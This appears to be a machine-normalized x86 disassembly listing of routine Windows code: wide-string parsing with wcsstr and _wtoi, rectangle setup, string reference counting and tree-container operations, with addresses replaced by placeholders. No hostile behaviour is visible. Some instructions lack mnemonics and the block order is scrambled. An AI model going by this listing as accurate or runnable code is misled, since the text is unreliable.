test eax eax
jne r-xdata
jmp [ esi * 4 + jump_table_429550 ]
mov edi [ ebp - 0x424 ]
xor edx edx
push 0x206
push edx
lea eax [ ebp - 0x216 ]
push eax
mov [ ebp - 0x44c ] edi
xor esi esi
mov [ ebp - 0x218 ] dx
call memset
lea ecx [ ebp - 0x218 ]
mov [ ebp - 0x424 ] ecx
movzx ecx [ edi ]
add esp 0xc
mov [ ebp - 0x448 ] ecx
test cx cx
je r-xdata
inc eax
cmp eax edx
jl r-xdata
mov edx [ ebp - 0x43c ]
xor ecx ecx
mov [ edx ] cx
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ ebp - 0x438 ] eax
mov [ ebp - 0x4 ] 0x0
test edi edi
je r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x428 ]
mov [ ecx ] edi
jmp r-xdata
mov edx [ ebp - 0x428 ]
mov [ edx + 0x4 ] edi
jmp r-xdata
mov eax [ ebp - 0x428 ]
mov [ eax + 0x8 ] edi
jmp r-xdata
mov ecx [ ebp - 0x428 ]
mov [ ecx + 0xc ] edi
lea ecx [ ebp - 0x218 ]
push ecx
call sub_43dbc0
mov esi [ ebp - 0x444 ]
mov ebx [ ebp - 0x438 ]
jmp r-xdata
xor edi edi
cmp cx 0x41
jb r-xdata
cmp cx 0x61
jb r-xdata
cmp cx 0x5a
jbe r-xdata
cmp cx 0x2e
jne r-xdata
cmp cx 0x7a
jbe r-xdata
test esi esi
jne r-xdata
test esi esi
je r-xdata
movzx eax [ edi + 0x2 ]
add edi 0x2
mov [ ebp - 0x44c ] edi
mov [ ebp - 0x448 ] eax
test ax ax
jne r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x424 ]
mov [ eax ] cx
add eax 0x2
mov [ ebp - 0x424 ] eax
jmp r-xdata
mov edx [ rw-data ]
mov eax [ edx ]
sub edi esi
push 0x2
sar edi 0x1
push edi
mov ecx rw-data
call eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x448 ]
test esi esi
je r-xdata
call sub_402c00
lea ebx [ eax + 0x10 ]
mov [ ebp - 0x460 ] ebx
test edi edi
js r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
lea ebx [ eax + 0x10 ]
mov [ ebp - 0x434 ] ebx
mov [ ebp - 0x4 ] 0xb
test esi 0xffff0000
jne r-xdata
cmp edi [ ebx - 0x8 ]
jg r-xdata
mov eax esi
lea edx [ eax + 0x2 ]
jmp r-xdata
movzx edi si
call sub_402660
test eax eax
je r-xdata
mov [ ebx - 0xc ] edi
add edi edi
push edi
push esi
xor ecx ecx
push edi
push ebx
mov [ edi + ebx ] cx
call [ memcpy_s@IAT ]
add esp 0x10
mov [ ebp - 0x4 ] 0x3
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x4 ] 0x5
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x4 ] 0x6
test ebx 0xffff0000
jne r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov [ ebp - 0x4 ] 0xc
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x4 ] 0xe
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x4 ] 0xf
test ebx ebx
je r-xdata
push eax
mov eax edi
lea edi [ ebp - 0x434 ]
call sub_402810
jmp r-xdata
mov eax ebx
lea edx [ eax + 0x2 ]
movzx edi bx
call sub_402660
test eax eax
je r-xdata
sub eax edx
sar eax 0x1
push esi
lea ecx [ ebp - 0x434 ]
push ecx
mov ebx eax
call sub_402910
xor eax eax
jmp r-xdata
test ebx 0xffff0000
jne r-xdata
mov ebx [ ebp - 0x434 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
push ebx
sar eax 0x1
lea ecx [ ebp - 0x430 ]
push ecx
mov ebx eax
call sub_402910
mov [ ebp - 0x4 ] 0x7
mov edi [ ebp - 0x458 ]
lea ecx [ ebp - 0x430 ]
lea eax [ edi + 0x4 ]
call sub_429c70
mov esi [ edi + 0x8 ]
mov [ ebp - 0x440 ] eax
cmp eax esi
je r-xdata
push eax
mov eax edi
lea edi [ ebp - 0x430 ]
call sub_402810
jmp r-xdata
push ebx
lea ecx [ ebp - 0x42c ]
push ecx
mov ebx eax
call sub_402910
mov eax ebx
lea edx [ eax + 0x2 ]
movzx edi bx
call sub_402660
test eax eax
je r-xdata
mov [ ebp - 0x45c ] esi
lea eax [ ebp - 0x45c ]
mov eax [ eax + 0xc ]
xor ecx ecx
test eax eax
setne cl
test ecx ecx
je r-xdata
mov [ ebp - 0x464 ] esi
lea eax [ ebp - 0x464 ]
mov eax [ eax + 0xc ]
xor ecx ecx
test eax eax
setne cl
test ecx ecx
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
mov [ ebp - 0x4 ] 0x10
mov edi [ ebp - 0x458 ]
lea ecx [ ebp - 0x42c ]
lea eax [ edi + 0x4 ]
call sub_429c70
mov esi [ edi + 0x8 ]
mov [ ebp - 0x440 ] eax
cmp eax esi
je r-xdata
push eax
mov eax edi
lea edi [ ebp - 0x42c ]
call sub_402810
jmp r-xdata
cmp esi [ edi + 0x8 ]
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
push 0x80004005
call sub_402d00
mov ecx eax
mov eax [ ebp - 0x430 ]
nop
cmp esi [ edi + 0x8 ]
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx eax
mov eax [ ebp - 0x42c ]
xor esi esi
mov esi [ esi + 0x10 ]
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test dx dx
je r-xdata
xor esi esi
mov esi [ esi + 0x10 ]
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test dx dx
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov edi [ ebp - 0x424 ]
sub eax esi
add edi 0xfffffffe
push esi
push r--data
lea edi [ ebp - 0x454 ]
call sub_401dc0
mov edx [ ebp - 0x454 ]
mov eax edx
add esp 0x8
mov esi eax
lea ebx [ ebx ]
lea eax [ ebp - 0x440 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov edi [ ebp - 0x424 ]
sub eax edx
add edi 0xfffffffe
push esi
push r--data
lea edi [ ebp - 0x450 ]
call sub_401dc0
mov ebx [ ebp - 0x450 ]
mov eax ebx
add esp 0x8
mov edx eax
lea ebx [ ebx ]
lea eax [ ebp - 0x440 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov cx [ edi + 0x2 ]
add edi 0x2
test cx cx
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp - 0x424 ]
mov eax [ edx - 0xc ]
lea eax [ ecx + eax * 2 ]
mov cx [ ebp - 0x448 ]
mov [ eax ] cx
add eax 0x2
mov [ ebp - 0x424 ] eax
xor esi esi
mov [ ebp - 0x4 ] 0x3
lea eax [ edx - 0x10 ]
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov esi [ eax ]
mov [ ebp - 0x4 ] 0x5
mov eax [ ebp - 0x430 ]
add eax 0xfffffff0
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
test eax eax
sets al
test al al
jne r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov cx [ edi + 0x2 ]
add edi 0x2
test cx cx
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
mov edx [ ebp - 0x424 ]
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx - 0xc ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
mov [ ebp - 0x4 ] 0xc
lea eax [ ebx - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov esi [ eax ]
mov [ ebp - 0x4 ] 0xe
mov eax [ ebp - 0x42c ]
add eax 0xfffffff0
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
test eax eax
sets al
test al al
jne r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x460 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x434 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
mov edi [ ebp - 0x44c ]
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_429560
push ebp
mov ebp esp
sub esp 0x218
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x20c ]
push 0x104
push eax
call [ wcscpy_s@IAT ]
lea edi [ ebp - 0x20c ]
xor ebx ebx
mov ecx edi
push r--data
push ecx
mov [ ebp - 0x214 ] ebx
mov [ ebp - 0x210 ] ebx
mov [ ebp - 0x218 ] ebx
call [ wcsstr@IAT ]
mov esi eax
add esp 0x14
test esi esi
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea ecx [ ecx ]
mov al [ ebp - 0x218 ]
push edi
call [ _wtoi@IAT ]
add esp 0x4
jmp r-xdata
push edi
call [ _wtoi@IAT ]
mov [ ebp - 0x214 ] eax
dec eax
je r-xdata
movzx ecx [ ebp - 0x210 ]
movzx edx [ ebp - 0x214 ]
movzx eax al
shl eax 0x8
or eax ecx
mov ecx [ ebp - 0x4 ]
pop edi
shl eax 0x8
pop esi
xor ecx ebp
or eax edx
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
xor edx edx
mov eax ebx
sub eax edx
mov [ esi ] dx
je r-xdata
test edi edi
je r-xdata
push edi
call [ _wtoi@IAT ]
mov [ ebp - 0x210 ] eax
jmp r-xdata
dec eax
jne r-xdata
add esp 0x4
lea edi [ esi + 0x2 ]
push r--data
push edi
inc ebx
call [ wcsstr@IAT ]
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
push edi
call [ _wtoi@IAT ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
sub_429670
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
push eax
lea eax [ ebp - 0x20c ]
push 0x104
push eax
call [ wcscpy_s@IAT ]
lea ecx [ ebp - 0x20c ]
push r--data
mov [ esi ] 0x0
push ecx
mov [ esi + 0x4 ] 0x0
call [ wcsstr@IAT ]
mov ebx [ _wtoi@IAT ]
mov edi eax
lea eax [ ebp - 0x20c ]
xor edx edx
push eax
mov [ edi ] dx
call ebx
add edi 0x2
push edi
mov [ esi ] eax
call ebx
mov ecx [ ebp - 0x4 ]
add esp 0x1c
pop edi
mov [ esi + 0x4 ] eax
xor ecx ebp
mov eax esi
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
sub_429700
push ebp
mov ebp esp
push 0xffffffff
push sub_44b57a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x10 ]
mov edi [ SetRectEmpty@IAT ]
push eax
call edi
push ebx
call edi
push esi
call edi
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004005
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn 0xc
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov ecx [ eax ]
lea edx [ ebp - 0x14 ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0x4
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x6
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x8
mov eax [ ebp - 0x14 ]
push r--data
push eax
lea edi [ ebp - 0x1c ]
call sub_428960
mov ecx [ ebp - 0x14 ]
push r--data
push ecx
lea edi [ ebp - 0x18 ]
call sub_428960
mov edx [ ebp - 0x14 ]
push r--data
push edx
lea edi [ ebp + 0xc ]
call sub_428960
mov eax [ ebp - 0x1c ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
lea ecx [ ebp - 0x4c ]
call sub_428d70
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
mov edi [ eax + 0x8 ]
mov [ ebp - 0x3c ] edx
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x38 ] ecx
mov ecx [ ebp + 0x8 ]
push eax
push ecx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x30 ] edx
call sub_428d70
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x2c ] edx
mov edx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x28 ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x24 ] edx
mov edx [ ebp + 0x8 ]
push ecx
push edx
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x20 ] eax
call sub_428d70
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebp - 0x4c ] ecx
mov ecx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x48 ] edx
mov edx [ ebp - 0x3c ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
mov edx [ ebp - 0x38 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp - 0x30 ]
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edx
mov edx [ eax ]
add edx edi
mov [ eax + 0x8 ] edx
mov edx [ eax + 0x4 ]
add edx [ ebp - 0x30 ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x2c ]
mov edx [ ebp - 0x28 ]
mov [ ebx ] eax
mov eax [ ebp - 0x24 ]
mov [ ebx + 0x4 ] edx
mov edx [ ebp - 0x20 ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
mov edi [ ebx ]
add edi eax
mov eax [ ebx + 0x4 ]
add eax edx
mov edx [ ebp - 0x4c ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x48 ]
mov [ ebx + 0x8 ] edi
mov [ esi ] edx
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] eax
mov edx [ esi ]
add edx ecx
mov ecx [ esi + 0x4 ]
add ecx eax
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] ecx
mov [ ebp - 0x4 ] 0x6
mov eax [ ebp + 0xc ]
add eax 0xfffffff0
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x18 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x1c ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn 0xc
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_429980
push ebp
mov ebp esp
push 0xffffffff
push sub_447a6e
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov edi edx
mov eax edi
call sub_429c70
mov esi eax
cmp esi [ edi + 0x4 ]
je r-xdata
mov eax [ ebx ]
sub eax 0x10
call sub_4025f0
lea ebx [ eax + 0x10 ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x3
lea eax [ ebp - 0x18 ]
push eax
mov ecx edi
call sub_42a630
push esi
lea esi [ ebp - 0x10 ]
call sub_42a080
mov esi [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebx - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ esi + 0xc ]
xor eax eax
test ecx ecx
setne al
test eax eax
jne r-xdata
lea eax [ esi + 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov eax [ ebx ]
push 0x80004005
call sub_402d00
sbb eax eax
sbb eax 0xffffffff
test dx dx
je r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
test eax eax
sets al
test al al
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sub_429a80
push ebp
mov ebp esp
push 0xffffffff
push sub_446ef8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea edi [ ebp - 0x10 ]
call sub_429bb0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi + 0x4 ]
push eax
call [ operator delete@IAT ]
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_429af0
push ebp
mov ebp esp
push 0xffffffff
push sub_445b2a
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_429b50
push ebp
mov ebp esp
push 0xffffffff
push sub_445af0
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_429bb0
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx edx
je r-xdata
cmp edx eax
jne r-xdata
mov [ edi ] ecx
mov eax edi
mov esp ebp
pop ebp
retn 0x8
jmp r-xdata
mov eax [ eax + 0x4 ]
push eax
mov ecx esi
call sub_429fa0
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x0
mov edx [ ecx ]
mov [ edi ] edx
mov eax edi
mov esp ebp
pop ebp
retn 0x8
cmp [ ecx + 0x15 ] 0x0
mov edx ecx
jne r-xdata
push edx
lea eax [ ebp - 0x4 ]
push eax
push esi
call sub_429ce0
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0xc ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ ebp + 0x8 ] eax
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ ebp + 0x8 ] ecx
jmp r-xdata
jmp r-xdata
mov ecx eax
mov [ ebp + 0x8 ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_429c70
mov eax [ eax + 0x4 ]
push edi
mov edi [ eax + 0x4 ]
cmp [ edi + 0x15 ] 0x0
jne r-xdata
pop edi
retn
push ebx
mov ebx [ ecx ]
push esi
push 0x80004005
call sub_402d00
mov ecx [ edi + 0xc ]
mov edx ebx
lea ebx [ ebx ]
sbb ecx ecx
sbb ecx 0xffffffff
test si si
je r-xdata
mov eax edi
mov edi [ edi ]
mov edi [ edi + 0x8 ]
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
test ebx ebx
je r-xdata
pop esi
pop ebx
cmp [ edi + 0x15 ] 0x0
je r-xdata
test ecx ecx
jns r-xdata
add ecx 0x4
add edx 0x4
test si si
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
sub_429ce0
push ebp
mov ebp esp
push 0xffffffff
push sub_446c0a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ebx eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] ebx
call sub_42a030
mov ecx [ ebx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
push r--data
call [ std::_Xout_of_range@IAT ]
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x15 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebx ]
mov [ eax ] ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x15 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov eax [ edx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx [ edx + 0x4 ]
mov [ ebp - 0x14 ] ecx
cmp [ ecx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
mov dl [ ebx + 0x14 ]
mov cl [ eax + 0x14 ]
mov [ eax + 0x14 ] dl
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x14 ] cl
mov eax [ ebp - 0x10 ]
mov bl 0x1
cmp [ eax + 0x14 ] bl
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov eax [ edi ]
cmp [ eax + 0x15 ] 0x0
mov ecx edi
jne r-xdata
mov ecx esi
jmp r-xdata
mov eax [ ebp - 0x10 ]
add eax 0xc
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ eax ]
sub eax 0x10
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov ecx [ edx + 0x4 ]
cmp edi [ ecx + 0x4 ]
je r-xdata
mov eax edi
call sub_413960
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax [ edx + 0x4 ]
mov [ eax ] ecx
nop
mov ecx [ ebp - 0x10 ]
push ecx
call [ operator delete@IAT ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ edi + 0x14 ] bl
cmp [ edi + 0x14 ] bl
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
dec eax
mov [ ecx + 0x8 ] eax
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_421c70
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_421c10
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x4 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ ecx + 0x4 ]
jne r-xdata
